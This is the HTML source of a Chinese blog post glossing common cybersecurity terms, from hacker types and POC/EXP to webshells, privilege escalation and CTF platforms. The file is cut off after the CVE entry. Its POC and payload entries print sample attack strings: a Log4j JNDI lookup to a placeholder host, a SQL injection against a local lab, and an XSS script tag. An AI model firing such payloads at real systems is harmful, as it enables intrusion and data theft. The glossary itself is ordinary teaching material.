@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.oliver.ren","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="黑客（hacker） 对计算机技术非常擅长的人，窃取数据、破坏计算机系统 匿名的（Anonymous）  脚本小子刚刚入门安全行业，学习了一些技术，只会只用现成的工具或者从网上复制代码 白帽子 白帽子的目的是发现企业的漏洞并且上报给企业，帮助其解决风险问题； 360补天、漏洞盒子、CNVD、CNNVD  红帽黑客 有正义感、爱国的黑客； 利用技术维护国家网络 安全，并且对外来的攻击进行反击。  漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全常用术语">
+<meta property="og:url" content="https://www.oliver.ren/2025/02/06/20250206-01.html">
+<meta property="og:site_name" content="Oliver&#39;s Blog">
+<meta property="og:description" content="黑客（hacker） 对计算机技术非常擅长的人，窃取数据、破坏计算机系统 匿名的（Anonymous）  脚本小子刚刚入门安全行业，学习了一些技术，只会只用现成的工具或者从网上复制代码 白帽子 白帽子的目的是发现企业的漏洞并且上报给企业，帮助其解决风险问题； 360补天、漏洞盒子、CNVD、CNNVD  红帽黑客 有正义感、爱国的黑客； 利用技术维护国家网络 安全，并且对外来的攻击进行反击。  漏">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-06T10:55:50.000Z">
+<meta property="article:modified_time" content="2025-02-27T11:22:44.050Z">
+<meta property="article:author" content="Oliver King">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://www.oliver.ren/2025/02/06/20250206-01.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.oliver.ren/2025/02/06/20250206-01.html","path":"2025/02/06/20250206-01.html","title":"网络安全常用术语"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>网络安全常用术语 | Oliver's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Oliver's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">小菜鸟要努力学习哦</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%EF%BC%88hacker%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">黑客（hacker）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90"><span class="nav-number">2.</span> <span class="nav-text">脚本小子</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%99%BD%E5%B8%BD%E5%AD%90"><span class="nav-number">3.</span> <span class="nav-text">白帽子</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E5%B8%BD%E9%BB%91%E5%AE%A2"><span class="nav-number">4.</span> <span class="nav-text">红帽黑客</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%EF%BC%88Vulnerability%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">漏洞（Vulnerability）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POC%EF%BC%88Proof-of-Concept%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">POC（Proof of Concept）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EXP"><span class="nav-number">7.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#payload"><span class="nav-number">8.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0day%E6%BC%8F%E6%B4%9E"><span class="nav-number">9.</span> <span class="nav-text">0day漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1day%E6%BC%8F%E6%B4%9E"><span class="nav-number">10.</span> <span class="nav-text">1day漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nday%E6%BC%8F%E6%B4%9E"><span class="nav-number">11.</span> <span class="nav-text">Nday漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%EF%BC%88%E6%BC%8F%E6%89%AB%EF%BC%89"><span class="nav-number">12.</span> <span class="nav-text">漏洞扫描（漏扫）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81"><span class="nav-number">13.</span> <span class="nav-text">补丁</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">14.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">15.</span> <span class="nav-text">渗透测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%A8%E9%A9%AC"><span class="nav-number">16.</span> <span class="nav-text">木马</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%97%85%E6%AF%92"><span class="nav-number">17.</span> <span class="nav-text">病毒</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="nav-number">18.</span> <span class="nav-text">杀毒软件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%8D%E6%9D%80"><span class="nav-number">19.</span> <span class="nav-text">免杀</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%82%89%E9%B8%A1"><span class="nav-number">20.</span> <span class="nav-text">肉鸡</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%93%E9%B8%A1"><span class="nav-number">21.</span> <span class="nav-text">抓鸡</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%B3%E6%9D%BF%E6%9C%BA"><span class="nav-number">22.</span> <span class="nav-text">跳板机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DDos"><span class="nav-number">23.</span> <span class="nav-text">DDos</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E9%97%A8"><span class="nav-number">24.</span> <span class="nav-text">后门</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="nav-number">25.</span> <span class="nav-text">中间人攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC"><span class="nav-number">26.</span> <span class="nav-text">网络钓鱼</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell"><span class="nav-number">27.</span> <span class="nav-text">webshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GetShell"><span class="nav-number">28.</span> <span class="nav-text">GetShell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">29.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8B%BF%E7%AB%99"><span class="nav-number">30.</span> <span class="nav-text">拿站</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%84%B1%EF%BC%88%E6%8B%96%EF%BC%89%E8%A3%A4"><span class="nav-number">31.</span> <span class="nav-text">脱（拖）裤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A3%85%E5%BA%93"><span class="nav-number">32.</span> <span class="nav-text">装库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%81%E7%AB%99%E5%85%A5%E4%BE%B5"><span class="nav-number">33.</span> <span class="nav-text">旁站入侵</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">34.</span> <span class="nav-text">横向移动</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%90%86"><span class="nav-number">35.</span> <span class="nav-text">代理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#VPN"><span class="nav-number">36.</span> <span class="nav-text">VPN</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%9C%9C%E7%BD%90"><span class="nav-number">37.</span> <span class="nav-text">蜜罐</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1"><span class="nav-number">38.</span> <span class="nav-text">沙箱</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA"><span class="nav-number">39.</span> <span class="nav-text">靶场</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%A1%E5%9E%92%E6%9C%BA"><span class="nav-number">40.</span> <span class="nav-text">堡垒机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#APT"><span class="nav-number">41.</span> <span class="nav-text">APT</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%EF%BC%88HVV%EF%BC%89"><span class="nav-number">42.</span> <span class="nav-text">护网（HVV）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF"><span class="nav-number">43.</span> <span class="nav-text">CTF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE"><span class="nav-number">44.</span> <span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CNVD"><span class="nav-number">45.</span> <span class="nav-text">CNVD</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="nav-number">46.</span> <span class="nav-text">应急响应</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SRC"><span class="nav-number">47.</span> <span class="nav-text">SRC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AC%E7%9B%8ASRC"><span class="nav-number">48.</span> <span class="nav-text">公益SRC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%B5%8B%E7%BB%98"><span class="nav-number">49.</span> <span class="nav-text">网络空间测绘</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ATT-CK"><span class="nav-number">50.</span> <span class="nav-text">ATT&amp;CK</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%86%E5%90%91"><span class="nav-number">51.</span> <span class="nav-text">逆向</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DevOps"><span class="nav-number">52.</span> <span class="nav-text">DevOps</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CICD"><span class="nav-number">53.</span> <span class="nav-text">CICD</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DevSecOps"><span class="nav-number">54.</span> <span class="nav-text">DevSecOps</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AD%89%E4%BF%9D"><span class="nav-number">55.</span> <span class="nav-text">等保</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Oliver King</p>
+  <div class="site-description" itemprop="description">Oliver's Blog|小菜鸟要努力学习哦</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.oliver.ren/2025/02/06/20250206-01.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Oliver King">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Oliver's Blog">
+      <meta itemprop="description" content="Oliver's Blog|小菜鸟要努力学习哦">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="网络安全常用术语 | Oliver's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          网络安全常用术语
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-06 18:55:50" itemprop="dateCreated datePublished" datetime="2025-02-06T18:55:50+08:00">2025-02-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-27 19:22:44" itemprop="dateModified" datetime="2025-02-27T19:22:44+08:00">2025-02-27</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="黑客（hacker）"><a href="#黑客（hacker）" class="headerlink" title="黑客（hacker）"></a>黑客（hacker）</h1><ul>
+<li>对计算机技术非常擅长的人，窃取数据、破坏计算机系统</li>
+<li>匿名的（Anonymous）</li>
+</ul>
+<h1 id="脚本小子"><a href="#脚本小子" class="headerlink" title="脚本小子"></a>脚本小子</h1><p>刚刚入门安全行业，学习了一些技术，只会只用现成的工具或者从网上复制代码</p>
+<h1 id="白帽子"><a href="#白帽子" class="headerlink" title="白帽子"></a>白帽子</h1><ul>
+<li>白帽子的目的是发现企业的漏洞并且上报给企业，帮助其解决风险问题；</li>
+<li>360补天、漏洞盒子、CNVD、CNNVD</li>
+</ul>
+<h1 id="红帽黑客"><a href="#红帽黑客" class="headerlink" title="红帽黑客"></a>红帽黑客</h1><ul>
+<li>有正义感、爱国的黑客；</li>
+<li>利用技术维护国家网络 安全，并且对外来的攻击进行反击。</li>
+</ul>
+<h1 id="漏洞（Vulnerability）"><a href="#漏洞（Vulnerability）" class="headerlink" title="漏洞（Vulnerability）"></a>漏洞（Vulnerability）</h1><ul>
+<li>漏洞指的是硬件、软件、协议等等存在的安全缺陷；</li>
+<li><a target="_blank" rel="noopener" href="http://www.cnnvd.org.cn/web/wz/bzxqById.tag?id=3&mkid=3">http://www.cnnvd.org.cn/web/wz/bzxqById.tag?id=3&amp;mkid=3</a></li>
+</ul>
+<h1 id="POC（Proof-of-Concept）"><a href="#POC（Proof-of-Concept）" class="headerlink" title="POC（Proof of Concept）"></a>POC（Proof of Concept）</h1><ul>
+<li>能证明漏洞存在的代码；</li>
+<li>例:${jndi:ldap:&#x2F;&#x2F;xxxxxx.dnslog.cn&#x2F;test}。</li>
+</ul>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><ul>
+<li>Exploit（利用）；</li>
+<li>执行了这一段利用代码之后，就能够达到攻击的目的；</li>
+<li>msf。</li>
+</ul>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><ul>
+<li>攻击载荷；</li>
+<li>SQL注入：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs/Less-3/?id=-1">http://localhost/sqli-labs/Less-3/?id=-1</a>‘) union select 1,2,database() –+</li>
+<li>XSS：<script>alert(1)</script></li>
+<li>log4j：${jndi:ldap:&#x2F;&#x2F;xxxxxx.domain.cn&#x2F;test}</li>
+</ul>
+<h1 id="0day漏洞"><a href="#0day漏洞" class="headerlink" title="0day漏洞"></a>0day漏洞</h1><p>使用量非常大的通用产品漏洞已经被发现了（还没有公开），官方还没有发布补丁或者修复方法的漏洞</p>
+<h1 id="1day漏洞"><a href="#1day漏洞" class="headerlink" title="1day漏洞"></a>1day漏洞</h1><p>POC和EXP已经被公开了，但是很多人还来不及修复的漏洞</p>
+<h1 id="Nday漏洞"><a href="#Nday漏洞" class="headerlink" title="Nday漏洞"></a>Nday漏洞</h1><h1 id="漏洞扫描（漏扫）"><a href="#漏洞扫描（漏扫）" class="headerlink" title="漏洞扫描（漏扫）"></a>漏洞扫描（漏扫）</h1><p>基于数据库对漏洞进行自动化扫描</p>
+<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><ul>
+<li>patch</li>
+<li>漏洞的修复程序</li>
+</ul>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><ul>
+<li>penetration</li>
+<li>黑客入侵网站或者计算机系统获取到控制计算机权限的过程</li>
+</ul>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><ul>
+<li>penetration test</li>
+<li>用黑客入侵的方式对系统进行安全测试，目的是找出和修复安全漏洞</li>
+<li>这个过程中不会影响系统的正常运行，也不会破坏数据</li>
+</ul>
+<h1 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h1><ul>
+<li>Trojan horse</li>
+<li>隐藏在计算机中的恶意程序</li>
+</ul>
+<h1 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h1><ul>
+<li>Virus</li>
+<li>恶意代码或程序</li>
+</ul>
+<h1 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h1><ul>
+<li>360</li>
+<li>瑞星</li>
+<li>江民</li>
+<li>金山</li>
+<li>诺顿</li>
+<li>卡巴斯基</li>
+<li>McAfee</li>
+</ul>
+<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>绕过杀毒软件</p>
+<h1 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h1><ul>
+<li>已经被黑客获得控制权限的机器，可能是个人电脑也可能是企业或者政府单位的服务器</li>
+<li>通常情况下因为使用者并不知道已经被入侵，所以黑客可以长期获得权限和控制。</li>
+</ul>
+<h1 id="抓鸡"><a href="#抓鸡" class="headerlink" title="抓鸡"></a>抓鸡</h1><p>利用出现概率非常高漏洞(比如log4j、永恒之蓝)，使用自动化方式获取肉鸡的行为</p>
+<h1 id="跳板机"><a href="#跳板机" class="headerlink" title="跳板机"></a>跳板机</h1><p>黑客为了防止被追溯和识别身份，一般都不会用自己的电脑发起攻击，而是利用获取的肉鸡来攻击其他目标，这个肉鸡就充当一个跳板的角色</p>
+<h1 id="DDos"><a href="#DDos" class="headerlink" title="DDos"></a>DDos</h1><ul>
+<li>Distributed Denial of Service</li>
+<li>分布式拒绝服务攻击</li>
+<li>发起大量恶意请求，导致正常用户无法访问</li>
+</ul>
+<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><ul>
+<li>backdoor</li>
+<li>黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”</li>
+</ul>
+<h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><ul>
+<li>Man-in-the-Middle Attack</li>
+<li>MITM攻击</li>
+<li>运行中间服务器，拦截并篡改数据</li>
+</ul>
+<h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>钓鱼网站指的是冒充的网站，用来窃取用户的账号密码</p>
+<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><ul>
+<li>shell是一种命令执行工具，可以对计算机进行控制</li>
+<li>webshell就是asp、php、jsp之外的web代码文件，通过这些代码文件可以执行任意的命令，对计算机做任意的操作</li>
+</ul>
+<p>分类：</p>
+<ul>
+<li>小马</li>
+<li>一句话木马：godzilla、behinder、ant sword</li>
+<li>大马</li>
+</ul>
+<h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><p>获得命令执行环境的操作</p>
+<p>例如：</p>
+<ul>
+<li>Redis的持久化功能</li>
+<li>MySQL的写文件功能</li>
+<li>MySQL的日志记录功能</li>
+<li>上传功能</li>
+<li>数据备份功能</li>
+<li>编辑器</li>
+</ul>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul>
+<li>Privilege Escalation</li>
+<li>权限提升</li>
+<li>利用普通用户把自己提升为管理员的操作</li>
+</ul>
+<h1 id="拿站"><a href="#拿站" class="headerlink" title="拿站"></a>拿站</h1><p>指得到一个网站的最高权限，即得到后台和管理员名字和密码</p>
+<h1 id="脱（拖）裤"><a href="#脱（拖）裤" class="headerlink" title="脱（拖）裤"></a>脱（拖）裤</h1><p>拖库指的是网站被入侵以后，黑客把全部的数据都导出，窃取到了数据文件</p>
+<h1 id="装库"><a href="#装库" class="headerlink" title="装库"></a>装库</h1><p>用获得的裤子去批量登录其他的网站</p>
+<h1 id="旁站入侵"><a href="#旁站入侵" class="headerlink" title="旁站入侵"></a>旁站入侵</h1><p>入侵同服务器的其他网站</p>
+<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>攻击者入侵一台服务器成功以后，基于内部网络，继续入侵同网段的其他机器</p>
+<h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><ul>
+<li>Proxy</li>
+<li>帮助发起网络请求的一台服务器</li>
+</ul>
+<h1 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h1><ul>
+<li>Virtual Private Network</li>
+<li>代理</li>
+<li>加密通信</li>
+<li>远程办公（从家里连接到公司内网）</li>
+</ul>
+<h1 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h1><ul>
+<li>HoneyPot</li>
+<li>吸引攻击者攻击的伪装系统，用来实现溯源和反制</li>
+</ul>
+<h1 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h1><ul>
+<li>Sandbox</li>
+<li>沙箱是一种按照安全策略限制程序行为的执行环境，就算有恶意代码，也只能影响沙箱环境而不会影响到操作系统。</li>
+</ul>
+<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p>模拟的有漏洞的环境<br>可以是网站、容器、操作系统</p>
+<p>类型：</p>
+<p>web综合靶场：DVWA、pikachu、bwapp<br>web专用靶场：sqli-labs、upload-labs、xss-labs<br>漏洞复现靶场：CVE-44228<br>操作系统靶场：vulnhub<br>CTF靶场：专门用来练习CTF题目，每个人都有一个独立的环境</p>
+<h1 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h1><p>jumpserver跳板机<br>运维审计系统：管理资源，审批，审计，访问控制，事件记录</p>
+<p>WAF</p>
+<p>Web Application Firewall<br>Web应用防火墙<br>对HTTP&#x2F;HTTPS的流量内容进行分析，拦截恶意攻击行为</p>
+<h1 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h1><p>Advanced Persistent Threat<br>高级可持续威胁攻击<br>指有组织在网络上对特定对象展开的持续有效的攻击活动<br>报告：2021深信服APT攻防趋势半年洞察</p>
+<h1 id="护网（HVV）"><a href="#护网（HVV）" class="headerlink" title="护网（HVV）"></a>护网（HVV）</h1><p>国家组织牵头组织事业单位，国企单位，名企单位等开展攻防两方的网络安全演习</p>
+<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>Capture The Flag夺旗赛：起源于1996年DEFCON全球黑客大会；解出题目，获得flag，就可以得分</p>
+<p>是一种黑客技术竞赛：</p>
+<p>解题形式：Jeopardy<br>攻防形式：Attack-Defense</p>
+<p>方向：</p>
+<p>Reverse<br>Pwn<br>Web<br>Crypto<br>Misc<br>Mobile</p>
+<p>常用在线CTF：</p>
+<p>bugku：<a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges/index.html">https://ctf.bugku.com/challenges/index.html</a><br>北京联合大学：<a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges">https://ctf.bugku.com/challenges</a><br>CTFHub：<a target="_blank" rel="noopener" href="https://www.ctfhub.com/">https://www.ctfhub.com/</a><br>bmzCTF：<a target="_blank" rel="noopener" href="http://bmzclub.cn/challenges">http://bmzclub.cn/challenges</a><br>攻防世界：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn</a><br>CTFSHOW：<a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a></p>
+<h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>Common Vulnerabilities and Exposures<br>通用漏洞披露</p>
+<p>Mitre</p>
+<p>例如：CVE-2021-44228</p>
+<p><a target="_blank" rel="noopener" href="https://www.cve.org/">https://www.cve.org/</a></p>
